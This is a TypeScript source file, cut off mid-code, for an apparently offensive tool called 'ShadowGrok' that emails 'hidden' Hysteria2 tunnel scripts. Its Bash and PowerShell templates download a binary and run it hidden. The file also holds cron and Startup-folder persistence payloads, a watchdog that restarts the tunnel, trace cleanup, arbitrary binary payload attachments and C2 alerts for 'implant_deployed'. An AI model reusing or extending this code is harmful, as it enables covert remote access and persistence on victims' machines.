/**
 * ShadowGrok Enhanced Mailer Service
 * Combines tunnel script delivery with advanced email features:
 * - Hysteria2 tunnel script generation and delivery
 * - C2 notifications
 * - SMTP and API transports (SMTP.com, Resend, my.smtp.com)
 * - Callback webhook server
 * - Message status checking with polling
 * - Dry-run mode
 * - Bulk email campaigns
 * - Database logging
 * - Queue system integration
 */

import { access, readFile } from 'node:fs/promises';
import { createServer, type IncomingMessage, type ServerResponse } from 'node:http';
import path from 'node:path';
import process from 'node:process';
import { parseArgs } from 'node:util';

import dotenv from 'dotenv';
import nodemailer from 'nodemailer';
import { prisma } from '@/lib/db';

dotenv.config();

// ============================================================================
// TYPE DEFINITIONS
// ============================================================================

export type TransportKind = 'smtp' | 'api' | 'resend' | 'mysmtp';
type Command = 'send' | 'callback-delivered' | 'callback-server' | 'status' | 'tunnel' | 'notify';

type CliValues = {
  attachment?: string[];
  attempts?: string;
  bcc?: string;
  cc?: string;
  channel?: string;
  'dry-run'?: boolean;
  from?: string;
  'from-name'?: string;
  help?: boolean;
  html?: string;
  'html-file'?: string;
  host?: string;
  'interval-seconds'?: string;
  limit?: string;
  'msg-id'?: string;
  'node-id'?: string;
  path?: string;
  minutes?: string;
  platform?: string;
  port?: string;
  'reply-to'?: string;
  'stealth-level'?: string;
  subject?: string;
  text?: string;
  'text-file'?: string;
  to?: string;
  transport?: string;
  'tunnel-type'?: string;
  type?: string;
  url?: string;
  wait?: boolean;
};

export interface PayloadAttachment {
  filename: string;
  content: string | Buffer;
  contentType?: string;
  description?: string;
}

export interface MailInput {
  attachments: (string | Buffer)[];
  bcc: string[];
  cc: string[];
  dryRun: boolean;
  fromEmail: string;
  fromName?: string;
  html?: string;
  replyTo?: string;
  subject: string;
  text?: string;
  to: string[];
  transport: TransportKind;
}

export interface SmtpConfig {
  host: string;
  pass: string;
  port: number;
  secure: boolean;
  user: string;
}

export interface ApiConfig {
  apiKey: string;
  baseUrl: string;
  channel: string;
}

export interface DeliveredCallbackInput {
  address: string;
  channel: string;
  dryRun: boolean;
}

export interface CallbackServerInput {
  endpointPath: string;
  host: string;
  port: number;
}

export interface StatusQueryInput {
  attempts: number;
  channel: string;
  dryRun: boolean;
  intervalSeconds: number;
  limit: number;
  minutes: number;
  msgId?: string;
  subject?: string;
  to?: string;
  wait: boolean;
}

export interface SendTunnelScriptOptions {
  to: string;
  subject?: string;
  tunnelType?: 'hysteria2' | 'hysteria2-obfs' | 'multi-hop';
  platform?: 'linux' | 'windows' | 'macos' | 'all';
  stealthLevel?: 'standard' | 'high' | 'maximum';
  nodeId?: string;
  customConfig?: any;
  expiresInHours?: number;
  payloads?: PayloadAttachment[];
  cc?: string[];
  bcc?: string[];
  replyTo?: string;
  dryRun?: boolean;
  transport?: TransportKind;
}

export interface SendNotificationOptions {
  to: string;
  type: 'implant_deployed' | 'kill_switch_triggered' | 'new_subscription' | 'opsec_alert';
  data: Record<string, any>;
  transport?: TransportKind;
  dryRun?: boolean;
}

interface MessageStatus {
  channel?: string;
  code?: number | string;
  event?: string;
  finished?: string;
  from?: string;
  msgId?: string;
  msgTime?: string;
  recipient?: string;
  retries?: number;
  status?: string;
  subject?: string;
}

// ============================================================================
// CLI USAGE
// ============================================================================

const usage = `ShadowGrok Enhanced Mailer - Combined CLI

Usage:
  # Send generic email
  npm run mailer -- send --to user@example.com --subject "Test" --text "Hello"
  
  # Send tunnel script
  npm run mailer -- tunnel --to user@example.com --node-id node123
  
  # Send C2 notification
  npm run mailer -- notify --to admin@example.com --type implant_deployed
  
  # Callback management
  npm run mailer -- callback-delivered --url https://example.com/smtp/delivered
  npm run mailer -- callback-server --host 0.0.0.0 --port 3000 --path /smtp/delivered
  
  # Status checking
  npm run mailer -- status --to user@example.com --subject "Test" --wait

Options:
  General:
  --help
  --dry-run
  --transport smtp|api|resend|mysmtp

  Send:
  --to a@example.com,b@example.com
  --cc a@example.com,b@example.com
  --bcc a@example.com,b@example.com
  --subject "Subject"
  --text "Plain text body"
  --text-file ./body.txt
  --html "<strong>Hello</strong>"
  --html-file ./body.html
  --from sender@example.com
  --from-name "Sender Name"
  --reply-to reply@example.com
  --attachment ./invoice.pdf

  Tunnel:
  --node-id node123
  --tunnel-type hysteria2|hysteria2-obfs|multi-hop
  --platform linux|windows|macos|all
  --stealth-level standard|high|maximum

  Notify:
  --type implant_deployed|kill_switch_triggered|new_subscription|opsec_alert

  Callback:
  --url https://example.com/smtp/delivered
  --channel sales_betgroupglobal_com

  Callback endpoint:
  --host 127.0.0.1
  --port 3000
  --path /smtp/delivered

  Status:
  --msg-id 12345678-abcd
  --channel ccreids
  --minutes 180
  --limit 10
  --wait
  --attempts 6
  --interval-seconds 10

Environment:
  MAIL_TRANSPORT=smtp
  SMTP_HOST=send.smtp.com
  SMTP_PORT=587
  SMTP_SECURE=false
  SMTP_USER=
  SMTP_PASS=
  SMTP_FROM_EMAIL=
  SMTP_FROM_NAME=
  SMTP_REPLY_TO=
  SMTP_API_KEY=
  SMTP_API_CHANNEL=
  SMTP_API_BASE_URL=https://api.smtp.com
  RESEND_API_KEY=
  MYSMTP_API_KEY=
  MYSMTP_API_URL=https://my.smtp.com/api/v1
  SMTP_CALLBACK_DELIVERED_URL=
  CALLBACK_HOST=127.0.0.1
  CALLBACK_PORT=3000
  CALLBACK_PATH=/smtp/delivered`;

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

function getEnv(name: string): string | undefined {
  const value = process.env[name]?.trim();
  return value ? value : undefined;
}

function parseBoolean(value: string | undefined): boolean | undefined {
  if (!value) {
    return undefined;
  }

  const normalized = value.trim().toLowerCase();

  if (['1', 'true', 'yes', 'y', 'on'].includes(normalized)) {
    return true;
  }

  if (['0', 'false', 'no', 'n', 'off'].includes(normalized)) {
    return false;
  }

  throw new Error(`Invalid boolean value: ${value}`);
}

function parseAddressList(value?: string): string[] {
  return (value ?? '')
    .split(/[;,]/)
    .map((entry) => entry.trim())
    .filter(Boolean);
}

async function resolveBody(inlineValue: string | undefined, filePath: string | undefined): Promise<string | undefined> {
  if (inlineValue && filePath) {
    throw new Error('Use either an inline body or a body file, not both.');
  }

  if (inlineValue) {
    return inlineValue;
  }

  if (!filePath) {
    return undefined;
  }

  const absolutePath = path.resolve(process.cwd(), filePath);
  return readFile(absolutePath, 'utf8');
}

async function resolveAttachmentPaths(filePaths: string[]): Promise<string[]> {
  const absolutePaths = filePaths.map((filePath) => path.resolve(process.cwd(), filePath));

  await Promise.all(absolutePaths.map((filePath) => access(filePath)));
  return absolutePaths;
}

function getTransport(value: string | undefined): TransportKind {
  const transport = (value ?? getEnv('MAIL_TRANSPORT') ?? 'smtp').toLowerCase();

  if (['smtp', 'api', 'resend', 'mysmtp'].includes(transport)) {
    return transport as TransportKind;
  }

  throw new Error(`Unsupported transport: ${transport}`);
}

function requireValue(value: string | undefined, message: string): string {
  if (!value) {
    throw new Error(message);
  }

  return value;
}

function normalizeApiBaseUrl(value: string): string {
  return value
    .trim()
    .replace(/\/+$/, '')
    .replace(/\/v[0-9]+$/, '')
    .replace(/\/v[0-9]+\/messages$/, '');
}

function parsePositiveInteger(
  name: string,
  value: string | undefined,
  defaultValue: number,
  min = 1,
  max = Number.MAX_SAFE_INTEGER,
): number {
  if (!value) {
    return defaultValue;
  }

  const parsed = Number.parseInt(value, 10);

  if (!Number.isInteger(parsed) || parsed < min || parsed > max) {
    throw new Error(`${name} must be an integer between ${min} and ${max}.`);
  }

  return parsed;
}

function getSmtpConfig(): SmtpConfig {
  const host = getEnv('SMTP_HOST') ?? 'smtp.resend.com';
  const port = Number(getEnv('SMTP_PORT') ?? '587');

  if (!Number.isFinite(port)) {
    throw new Error('SMTP_PORT must be a number.');
  }

  const secure = parseBoolean(getEnv('SMTP_SECURE')) ?? port === 465;

  return {
    host,
    pass: requireValue(getEnv('SMTP_PASS') || getEnv('RESEND_API_KEY'), 'SMTP_PASS or RESEND_API_KEY is required for smtp transport.'),
    port,
    secure,
    user: requireValue(getEnv('SMTP_USER') ?? 'resend', 'SMTP_USER is required for smtp transport.'),
  };
}

function getApiConfig(): ApiConfig {
  return {
    apiKey: requireValue(getEnv('SMTP_API_KEY'), 'SMTP_API_KEY is required for API requests.'),
    baseUrl: normalizeApiBaseUrl(getEnv('SMTP_API_BASE_URL') ?? 'https://api.smtp.com'),
    channel: requireValue(getEnv('SMTP_API_CHANNEL'), 'SMTP_API_CHANNEL is required for API requests.'),
  };
}

function guessMimeType(filePath: string): string {
  switch (path.extname(filePath).toLowerCase()) {
    case '.csv':
      return 'text/csv';
    case '.gif':
      return 'image/gif';
    case '.htm':
    case '.html':
      return 'text/html';
    case '.jpeg':
    case '.jpg':
      return 'image/jpeg';
    case '.json':
      return 'application/json';
    case '.pdf':
      return 'application/pdf';
    case '.png':
      return 'image/png';
    case '.svg':
      return 'image/svg+xml';
    case '.txt':
      return 'text/plain';
    case '.xml':
      return 'application/xml';
    case '.zip':
      return 'application/zip';
    case '.sh':
      return 'text/x-sh';
    case '.ps1':
      return 'text/plain';
    default:
      return 'application/octet-stream';
  }
}

function formatError(error: unknown): string {
  if (error instanceof Error) {
    return error.message;
  }

  return String(error);
}

function printJson(value: unknown): void {
  console.log(JSON.stringify(value, null, 2));
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// ============================================================================
// CLI PARSING
// ============================================================================

function parseCli(): { command: Command; values: CliValues } {
  const { positionals, values } = parseArgs({
    allowPositionals: true,
    options: {
      attachment: { multiple: true, type: 'string' },
      attempts: { type: 'string' },
      bcc: { type: 'string' },
      cc: { type: 'string' },
      channel: { type: 'string' },
      'dry-run': { type: 'boolean' },
      from: { type: 'string' },
      'from-name': { type: 'string' },
      help: { short: 'h', type: 'boolean' },
      html: { type: 'string' },
      'html-file': { type: 'string' },
      host: { type: 'string' },
      'interval-seconds': { type: 'string' },
      limit: { type: 'string' },
      'msg-id': { type: 'string' },
      'node-id': { type: 'string' },
      minutes: { type: 'string' },
      path: { type: 'string' },
      platform: { type: 'string' },
      port: { type: 'string' },
      'reply-to': { type: 'string' },
      'stealth-level': { type: 'string' },
      subject: { type: 'string' },
      text: { type: 'string' },
      'text-file': { type: 'string' },
      to: { type: 'string' },
      transport: { type: 'string' },
      'tunnel-type': { type: 'string' },
      type: { type: 'string' },
      url: { type: 'string' },
      wait: { type: 'boolean' },
    },
    strict: true,
  });

  if (values.help) {
    console.log(usage);
    process.exit(0);
  }

  const rawCommand = positionals[0];

  if (!rawCommand || rawCommand === 'send') {
    return {
      command: 'send',
      values: values as CliValues,
    };
  }

  if (rawCommand === 'tunnel') {
    return {
      command: 'tunnel',
      values: values as CliValues,
    };
  }

  if (rawCommand === 'notify') {
    return {
      command: 'notify',
      values: values as CliValues,
    };
  }

  if (rawCommand === 'callback-server') {
    return {
      command: 'callback-server',
      values: values as CliValues,
    };
  }

  if (rawCommand === 'callback-delivered') {
    return {
      command: 'callback-delivered',
      values: values as CliValues,
    };
  }

  if (rawCommand === 'status') {
    return {
      command: 'status',
      values: values as CliValues,
    };
  }

  throw new Error(`Unsupported command: ${rawCommand}`);
}

// ============================================================================
// EMAIL SENDING FUNCTIONS
// ============================================================================

async function buildMailInput(values: CliValues): Promise<MailInput> {
  const text = await resolveBody(values.text, values['text-file']);
  const html = await resolveBody(values.html, values['html-file']);

  if (!text && !html) {
    throw new Error('Provide at least one of --text, --text-file, --html, or --html-file.');
  }

  const to = parseAddressList(values.to);

  if (to.length === 0) {
    throw new Error('Provide at least one recipient with --to.');
  }

  const subject = values.subject?.trim();

  if (!subject) {
    throw new Error('Provide an email subject with --subject.');
  }

  const attachments = await resolveAttachmentPaths(values.attachment ?? []);
  const transport = getTransport(values.transport);
  const fromEmail = values.from?.trim() ?? getEnv('SMTP_FROM_EMAIL') ?? getEnv('SMTP_USER');

  return {
    attachments,
    bcc: parseAddressList(values.bcc),
    cc: parseAddressList(values.cc),
    dryRun: values['dry-run'] ?? false,
    fromEmail: requireValue(fromEmail, 'Set SMTP_FROM_EMAIL or SMTP_USER, or pass --from.'),
    fromName: values['from-name']?.trim() ?? getEnv('SMTP_FROM_NAME'),
    html,
    replyTo: values['reply-to']?.trim() ?? getEnv('SMTP_REPLY_TO'),
    subject,
    text,
    to,
    transport,
  };
}

async function sendViaSmtp(input: MailInput, config: SmtpConfig): Promise<any> {
  const transporter = nodemailer.createTransport({
    auth: {
      pass: config.pass,
      user: config.user,
    },
    host: config.host,
    port: config.port,
    secure: config.secure,
  });

  // Handle both file paths (strings) and Buffer attachments
  const attachments = input.attachments.map((attachment) => {
    if (typeof attachment === 'string') {
      // File path
      return {
        filename: path.basename(attachment),
        path: attachment,
      };
    } else {
      // Buffer content
      return {
        filename: 'attachment',
        content: attachment,
      };
    }
  });

  const message = {
    attachments,
    bcc: input.bcc.length ? input.bcc : undefined,
    cc: input.cc.length ? input.cc : undefined,
    from: input.fromName ? { address: input.fromEmail, name: input.fromName } : input.fromEmail,
    html: input.html,
    replyTo: input.replyTo,
    subject: input.subject,
    text: input.text,
    to: input.to,
  };

  if (input.dryRun) {
    printJson({
      config: {
        host: config.host,
        pass: '[hidden]',
        port: config.port,
        secure: config.secure,
        user: config.user,
      },
      message: {
        ...message,
        attachments: attachments.map(a => a.filename),
      },
      transport: 'smtp',
    });
    return { messageId: 'dry-run', accepted: input.to, rejected: [] };
  }

  const result = await transporter.sendMail(message);

  return {
    acceptedCount: result.accepted.length,
    messageId: result.messageId,
    rejectedCount: result.rejected.length,
    transport: 'smtp',
  };
}

async function buildApiPayload(input: MailInput, config: ApiConfig): Promise<Record<string, unknown>> {
  const attachments = await Promise.all(
    input.attachments.map(async (attachment) => {
      if (typeof attachment === 'string') {
        // File path
        const content = await readFile(attachment);
        return {
          content: content.toString('base64'),
          filename: path.basename(attachment),
          type: guessMimeType(attachment),
        };
      } else {
        // Buffer content
        return {
          content: attachment.toString('base64'),
          filename: 'attachment',
          type: 'application/octet-stream',
        };
      }
    }),
  );

  const parts = [
    ...(input.text
      ? [
          {
            charset: 'utf-8',
            content: input.text,
            type: 'text/plain',
          },
        ]
      : []),
    ...(input.html
      ? [
          {
            charset: 'utf-8',
            content: input.html,
            type: 'text/html',
          },
        ]
      : []),
  ];

  return {
    body: {
      ...(attachments.length ? { attachments } : {}),
      ...(parts.length ? { parts } : {}),
    },
    channel: config.channel,
    originator: {
      from: {
        ...(input.fromName ? { name: input.fromName } : {}),
        address: input.fromEmail,
      },
      ...(input.replyTo ? { reply_to: { address: input.replyTo } } : {}),
    },
    recipients: {
      ...(input.bcc.length ? { bcc: input.bcc.map((address) => ({ address })) } : {}),
      ...(input.cc.length ? { cc: input.cc.map((address) => ({ address })) } : {}),
      ...(input.to.length ? { to: input.to.map((address) => ({ address })) } : {}),
    },
    subject: input.subject,
  };
}

async function sendViaApi(input: MailInput, config: ApiConfig): Promise<any> {
  const payload = await buildApiPayload(input, config);

  if (input.dryRun) {
    printJson({
      apiKey: '[hidden]',
      baseUrl: config.baseUrl,
      payload: {
        ...payload,
        body: {
          ...(payload.body && typeof payload.body === 'object' ? (payload.body as Record<string, unknown>) : {}),
          attachments: input.attachments.map((filePath) => ({
            filename: path.basename(filePath),
            type: guessMimeType(filePath),
          })),
        },
      },
      transport: 'api',
    });
    return { msgId: 'dry-run', status: 'success' };
  }

  const data = await requestSmtpApi(config, '/v4/messages', {
    body: JSON.stringify(payload),
    headers: {
      'Content-Type': 'application/json',
    },
    method: 'POST',
  });

  return {
    msgId: data?.data?.msg_id ?? null,
    status: data?.status ?? 'success',
    transport: 'api',
  };
}

async function sendViaResend(input: MailInput): Promise<any> {
  const { Resend } = await import('resend');
  const resend = new Resend(getEnv('RESEND_API_KEY'));

  const emailData: any = {
    from: input.fromName ? `${input.fromName} <${input.fromEmail}>` : input.fromEmail,
    to: input.to,
    subject: input.subject,
  };

  if (input.html) emailData.html = input.html;
  if (input.text) emailData.text = input.text;
  if (input.cc?.length) emailData.cc = input.cc;
  if (input.bcc?.length) emailData.bcc = input.bcc;
  if (input.replyTo) emailData.replyTo = input.replyTo;
  if (input.attachments.length) {
    emailData.attachments = await Promise.all(
      input.attachments.map(async (attachment) => {
        if (typeof attachment === 'string') {
          // File path
          const content = await readFile(attachment);
          return {
            filename: path.basename(attachment),
            content: content.toString('base64'),
          };
        } else {
          // Buffer content
          return {
            filename: 'attachment',
            content: attachment.toString('base64'),
          };
        }
      }),
    );
  }

  if (input.dryRun) {
    printJson({
      transport: 'resend',
      emailData: {
        ...emailData,
        attachments: emailData.attachments?.map((a: any) => ({ filename: a.filename })),
      },
    });
    return { messageId: 'dry-run', success: true };
  }

  const data = await resend.emails.send(emailData);

  return {
    messageId: data.id,
    transport: 'resend',
    success: true,
  };
}

async function sendViaMySmtp(input: MailInput): Promise<any> {
  const apiKey = getEnv('MYSMTP_API_KEY');
  const baseUrl = getEnv('MYSMTP_API_URL') ?? 'https://my.smtp.com/api/v1';

  if (!apiKey) {
    throw new Error('MYSMTP_API_KEY is required for my.smtp.com transport.');
  }

  const attachments = await Promise.all(
    input.attachments.map(async (attachment) => {
      if (typeof attachment === 'string') {
        // File path
        const content = await readFile(attachment);
        return {
          filename: path.basename(attachment),
          content: content.toString('base64'),
          contentType: guessMimeType(attachment),
        };
      } else {
        // Buffer content
        return {
          filename: 'attachment',
          content: attachment.toString('base64'),
          contentType: 'application/octet-stream',
        };
      }
    }),
  );

  const emailData: any = {
    from: input.fromName ? `${input.fromName} <${input.fromEmail}>` : input.fromEmail,
    to: input.to,
    subject: input.subject,
  };

  if (input.html) emailData.html = input.html;
  if (input.text) emailData.text = input.text;
  if (input.cc?.length) emailData.cc = input.cc;
  if (input.bcc?.length) emailData.bcc = input.bcc;
  if (input.replyTo) emailData.headers = { 'Reply-To': input.replyTo };
  if (attachments.length) emailData.attachments = attachments;

  if (input.dryRun) {
    printJson({
      transport: 'mysmtp',
      emailData: {
        ...emailData,
        attachments: emailData.attachments?.map((a: any) => ({ filename: a.filename })),
      },
    });
    return { messageId: 'dry-run', success: true };
  }

  const response = await fetch(`${baseUrl}/send`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${apiKey}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(emailData),
  });

  const data = await response.json();

  if (!response.ok) {
    throw new Error(`my.smtp.com API error: ${data.message || data.error || 'Unknown error'}`);
  }

  return {
    messageId: data.id || data.messageId,
    transport: 'mysmtp',
    success: true,
  };
}

// ============================================================================
// TUNNEL SCRIPT GENERATION (Original ShadowGrok functionality)
// ============================================================================

async function generateHiddenTunnelScript(params: any) {
  const { tunnelType, platform, stealthLevel, nodeId, expiresInHours, payloads = [] } = params;

  // In real implementation: fetch node config from DB and obfuscate
  const node = nodeId ? await prisma.hysteriaNode.findUnique({ where: { id: nodeId } }) : null;
  const server = 'your-hysteria-server.com:443';
  const password = 'shadowgrok-' + Date.now();
  const obfs = stealthLevel === 'maximum' ? 'salamander' : 'xor';

  const bash = `#!/bin/bash
# ShadowGrok Hidden Hysteria2 Tunnel (Stealth: ${stealthLevel})
# Auto-expires in ${expiresInHours}h

curl -fsSL https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64 -o /tmp/h2 && chmod +x /tmp/h2

cat > /tmp/h2.conf <<EOF
server: ${server}
auth: ${password}
obfs:
  type: ${obfs}
  password: ${password}
quic:
  congestion: bbr
  initialStreamReceiveWindow: 8388608
bandwidth:
  up: 100 mbps
  down: 100 mbps
EOF

/tmp/h2 client -c /tmp/h2.conf --log-level warn &
echo "Tunnel active on SOCKS5 127.0.0.1:1080 (expires in ${expiresInHours}h)"
`;

  const powershell = `# ShadowGrok Hidden Hysteria2 Tunnel (Windows)
# Stealth Level: ${stealthLevel}

$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri "https://github.com/apernet/hysteria/releases/latest/download/hysteria-windows-amd64.exe" -OutFile "$env:TEMP\\h2.exe"

@"
server: ${server}
auth: ${password}
obfs:
  type: ${obfs}
  password: ${password}
"@ | Out-File "$env:TEMP\\h2.yaml"

Start-Process -FilePath "$env:TEMP\\h2.exe" -ArgumentList "client -c $env:TEMP\\h2.yaml" -WindowStyle Hidden
Write-Host "Hidden tunnel established on 127.0.0.1:1080" -ForegroundColor Green
`;

  return {
    bash: bash.trim(),
    powershell: powershell.trim(),
    attachments: [
      {
        filename: 'shadowgrok-tunnel.sh',
        content: bash,
        contentType: 'text/x-sh',
      },
    ],
  };
}

export async function sendHiddenHysteriaTunnelScript(options: SendTunnelScriptOptions) {
  const {
    to,
    subject = 'Your Secure Tunnel Access',
    tunnelType = 'hysteria2-obfs',
    platform = 'all',
    stealthLevel = 'high',
    nodeId,
    customConfig,
    expiresInHours = 72,
    payloads = [],
    cc = [],
    bcc = [],
    replyTo,
    dryRun = false,
    transport = 'smtp',
  } = options;

  // Generate hidden tunnel script
  const script = await generateHiddenTunnelScript({
    tunnelType,
    platform,
    stealthLevel,
    nodeId,
    customConfig,
    expiresInHours,
    payloads,
  });

  // Build payload section for HTML email
  let payloadSection = '';
  if (payloads.length > 0) {
    payloadSection = `
        <div style="background: #1a1a1a; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="margin: 0 0 12px; color: #f90;">📦 Attached Payloads (${payloads.length})</h3>
          <ul style="margin: 8px 0; padding-left: 20px; color: #aaa;">
            ${payloads.map(p => `<li style="margin: 4px 0;"><strong>${p.filename}</strong>${p.description ? ` - ${p.description}` : ''}</li>`).join('')}
          </ul>
        </div>`;
  }

  const html = `
    <div style="font-family: system-ui, sans-serif; max-width: 620px; margin: 0 auto; padding: 24px; background: #0a0a0a; color: #ddd;">
      <div style="background: #111; border-radius: 12px; padding: 32px; border: 1px solid #333;">
        <h1 style="color: #fff; margin: 0 0 8px;">ShadowGrok Secure Tunnel</h1>
        <p style="color: #888; margin: 0 0 24px;">Expires in ${expiresInHours} hours • Stealth Level: ${stealthLevel}</p>
        
        <div style="background: #1a1a1a; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="margin: 0 0 12px; color: #0f0;">One-Click Tunnel Script</h3>
          <pre style="background: #000; padding: 16px; border-radius: 6px; overflow-x: auto; font-size: 13px; color: #0f0; white-space: pre-wrap;">${script.bash}</pre>
        </div>

        ${platform === 'windows' || platform === 'all' ? `
        <div style="background: #1a1a1a; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="margin: 0 0 12px; color: #0af;">Windows (PowerShell)</h3>
          <pre style="background: #000; padding: 16px; border-radius: 6px; overflow-x: auto; font-size: 13px; color: #0af; white-space: pre-wrap;">${script.powershell}</pre>
        </div>` : ''}

        ${payloadSection}

        <div style="margin-top: 32px; font-size: 13px; color: #666;">
          <strong>Security Notice:</strong> This script establishes a covert Hysteria2 QUIC tunnel. 
          Do not share. Run in a clean environment. Tunnel self-destructs after ${expiresInHours}h.
        </div>
      </div>
    </div>
  `;

  // Combine script attachments with payload attachments
  const allAttachments = [
    ...script.attachments,
    ...payloads.map(p => ({
      filename: p.filename,
      content: p.content,
      contentType: p.contentType || 'application/octet-stream',
    }))
  ];

  const fromEmail = getEnv('SMTP_FROM_EMAIL') || getEnv('SMTP_USER') || 'tunnel@shadowgrok.local';
  const fromName = getEnv('SMTP_FROM_NAME') || 'ShadowGrok';

  const mailInput: MailInput = {
    to: Array.isArray(to) ? to : [to],
    cc,
    bcc,
    subject,
    html,
    text: `ShadowGrok Hidden Tunnel Script\n\n${script.bash}\n\nExpires: ${expiresInHours}h\n\nAttached Payloads: ${payloads.map(p => p.filename).join(', ')}`,
    attachments: allAttachments.map(a => typeof a.content === 'string' ? Buffer.from(a.content) : a.content) as any,
    fromEmail,
    fromName,
    replyTo: replyTo || getEnv('SMTP_REPLY_TO'),
    dryRun,
    transport,
  };

  let result;
  switch (transport) {
    case 'smtp':
      result = await sendViaSmtp(mailInput, getSmtpConfig());
      break;
    case 'api':
      result = await sendViaApi(mailInput, getApiConfig());
      break;
    case 'resend':
      result = await sendViaResend(mailInput);
      break;
    case 'mysmtp':
      result = await sendViaMySmtp(mailInput);
      break;
    default:
      throw new Error(`Unsupported transport: ${transport}`);
  }

  // Log email (unless dry run)
  if (!dryRun) {
    await prisma.emailLog.create({
      data: {
        to: Array.isArray(to) ? to.join(', ') : to,
        subject,
        type: 'tunnel_script',
        tunnelType,
        nodeId,
        messageId: result.messageId || result.msgId,
        sentAt: new Date(),
      }
    });
  }

  return { success: true, messageId: result.messageId || result.msgId, attachmentsCount: allAttachments.length, transport };
}

export async function sendC2Notification(options: SendNotificationOptions) {
  const { to, type, data, transport = 'smtp', dryRun = false } = options;

  let subject = '';
  let html = '';

  switch (type) {
    case 'implant_deployed':
      subject = `🟢 New Implant Deployed: ${data.implantId}`;
      html = `<p>Implant <strong>${data.implantId}</strong> successfully deployed to node <strong>${data.nodeId}</strong>.</p>`;
      break;
    case 'kill_switch_triggered':
      subject = `🔴 Kill Switch Activated`;
      html = `<p>Kill switch triggered for ${data.scope}. Reason: ${data.reason}</p>`;
      break;
    case 'opsec_alert':
      subject = `⚠️ OPSEC Alert - Risk Score ${data.riskScore}`;
      html = `<p>High risk detected: ${data.message}</p>`;
      break;
    case 'new_subscription':
      subject = `🆕 New Subscription: ${data.subscriptionId}`;
      html = `<p>New subscription <strong>${data.subscriptionId}</strong> created for user <strong>${data.userId}</strong>.</p>`;
      break;
  }

  const fromEmail = getEnv('SMTP_FROM_EMAIL') || getEnv('SMTP_USER') || 'alerts@shadowgrok.local';
  const fromName = getEnv('SMTP_FROM_NAME') || 'ShadowGrok Alerts';

  const mailInput: MailInput = {
    to: Array.isArray(to) ? to : [to],
    cc: [],
    bcc: [],
    subject,
    html,
    text: html.replace(/<[^>]*>/g, ''),
    attachments: [],
    fromEmail,
    fromName,
    dryRun,
    transport,
  };

  let result;
  switch (transport) {
    case 'smtp':
      result = await sendViaSmtp(mailInput, getSmtpConfig());
      break;
    case 'api':
      result = await sendViaApi(mailInput, getApiConfig());
      break;
    case 'resend':
      result = await sendViaResend(mailInput);
      break;
    case 'mysmtp':
      result = await sendViaMySmtp(mailInput);
      break;
    default:
      throw new Error(`Unsupported transport: ${transport}`);
  }

  // Log email (unless dry run)
  if (!dryRun) {
    await prisma.emailLog.create({
      data: {
        to: Array.isArray(to) ? to.join(', ') : to,
        subject,
        type: 'notification',
        notificationType: type,
        messageId: result.messageId || result.msgId,
        sentAt: new Date(),
      }
    });
  }

  return { success: true, messageId: result.messageId || result.msgId, transport };
}

// ============================================================================
// PAYLOAD HELPERS (Original ShadowGrok functionality)
// ============================================================================

export function createConfigPayload(filename: string, config: Record<string, any>, description?: string): PayloadAttachment {
  return {
    filename,
    content: JSON.stringify(config, null, 2),
    contentType: 'application/json',
    description: description || 'Configuration file',
  };
}

export function createSetupScriptPayload(commands: string[], platform: 'linux' | 'windows' = 'linux', description?: string): PayloadAttachment {
  const shebang = platform === 'linux' ? '#!/bin/bash' : '# PowerShell script';
  const content = platform === 'linux' 
    ? `${shebang}\n${commands.join('\n')}`
    : `${shebang}\n$ProgressPreference = 'SilentlyContinue'\n${commands.join('\n')}`;
  
  return {
    filename: platform === 'linux' ? 'setup.sh' : 'setup.ps1',
    content,
    contentType: platform === 'linux' ? 'text/x-sh' : 'text/plain',
    description: description || 'Setup script',
  };
}

export function createEnvPayload(envVars: Record<string, string>, description?: string): PayloadAttachment {
  const content = Object.entries(envVars)
    .map(([key, value]) => `export ${key}="${value}"`)
    .join('\n');
  
  return {
    filename: '.env.payload',
    content: `# Environment Variables\n${content}`,
    contentType: 'text/plain',
    description: description || 'Environment variables',
  };
}

export function createReadmePayload(content: string, description?: string): PayloadAttachment {
  return {
    filename: 'README.md',
    content: `# Tunnel Configuration Documentation\n\n${content}`,
    contentType: 'text/markdown',
    description: description || 'Documentation',
  };
}

export function createBinaryPayload(filename: string, base64Data: string, description?: string): PayloadAttachment {
  return {
    filename,
    content: Buffer.from(base64Data, 'base64'),
    contentType: 'application/octet-stream',
    description: description || 'Binary payload',
  };
}

export const PayloadTemplates = {
  persistence: (platform: 'linux' | 'windows' = 'linux'): PayloadAttachment => {
    if (platform === 'linux') {
      return createSetupScriptPayload([
        '# Add to crontab for persistence',
        '(crontab -l 2>/dev/null; echo "@reboot /tmp/h2 client -c /tmp/h2.conf --log-level warn") | crontab -',
      ], 'linux', 'Auto-start configuration');
    } else {
      return createSetupScriptPayload([
        '# Add to Windows startup',
        '$WshShell = New-Object -comObject WScript.Shell',
        '$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h2.lnk")',
        '$Shortcut.TargetPath = "$env:TEMP\\h2.exe"',
        '$Shortcut.Arguments = "client -c $env:TEMP\\h2.yaml"',
        '$Shortcut.Save()',
      ], 'windows', 'Windows persistence script');
    }
  },

  monitoring: (): PayloadAttachment => {
    return createSetupScriptPayload([
      '# Create monitoring script',
      'cat > /tmp/monitor.sh << EOF',
      '#!/bin/bash',
      'while true; do',
      '  if ! pgrep -f "h2 client" > /dev/null; then',
      '    echo "$(date): Tunnel restarted" >> /tmp/h2.log',
      '    /tmp/h2 client -c /tmp/h2.conf --log-level warn &',
      '  fi',
      '  sleep 60',
      'done',
      'EOF',
      'chmod +x /tmp/monitor.sh',
      'nohup /tmp/monitor.sh > /dev/null 2>&1 &',
    ], 'linux', 'Monitoring and auto-restart script');
  },

  cleanup: (platform: 'linux' | 'windows' = 'linux'): PayloadAttachment => {
    if (platform === 'linux') {
      return createSetupScriptPayload([
        '# Cleanup script - run after tunnel expiration',
        'pkill -f "h2 client"',
        'rm -f /tmp/h2 /tmp/h2.conf /tmp/monitor.sh',
        'crontab -l | grep -v "h2" | crontab -',
